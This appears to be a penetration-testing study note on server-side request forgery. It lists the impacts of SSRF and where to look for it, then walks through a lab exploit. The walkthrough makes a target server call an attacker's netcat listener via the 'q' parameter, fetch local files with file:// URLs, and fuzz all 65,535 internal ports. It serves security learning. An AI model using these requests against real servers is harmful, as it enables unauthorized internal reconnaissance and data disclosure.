Allows us to abuse server functionality to perform internal or external resource requests on behalf of the server. This can lead to:
-   Interacting with known internal systems
-   Discovering internal services via port scans
-   Disclosing local/sensitive data
-   Including files in the target application
-   Leaking NetNTLM hashes using UNC Paths (Windows)
-   Achieving remote code execution

To find SSRF, look for:
-   Parts of HTTP requests, including URLs
-   File imports such as HTML, PDFs, images, etc.
-   Remote server connections to fetch data
-   API specification imports
-   Dashboards including ping and similar functionalities to check server statuses

Don't limit fuzzing to input fields only. Look at parts of the HTTP request also.

### SSRF Exploitation Example

SSRF can be chained.
![Pasted image 20230208055006.png](data:image/png;base64,)

Start with Nmap to discover open ports.

Then cURL into the target server using -i to show protocol response headers and -s to use silent mode.

cURLing into the module's test target gives us a redirect that is passed to the site by a parameter "q".  We cURL again into the target using the -L switch to instruct cURL to follow redirects.
![Pasted image 20230208055838.png](data:image/png;base64,)

So now we should see if we can access other sites through the server via the 'q' parameter.  If we setup a netcat listener on our machine we can get the server to call it through the q parameter:
```bash
nc -lvnp 8080
```
then
```bash
user@computer $ curl -i -s http://$TGT/load?q=http://<VPN/TUN Adapter IP>:8080
```

We can access remote resources via the q parameter in cases like this.  We can also have it call for files via FTP protocols or fetch local files with the "file" URL.

We can also look for internal applications listening on the localhost.  Create a wordlist for all the port numbers

```
user$computer$ for port in {1..65535};do echo $port >> ports.txt; done
```

Issue the curl request to a random port here to get a response size.  Then fuzz all the ports and filter by the size to find any internal ports.
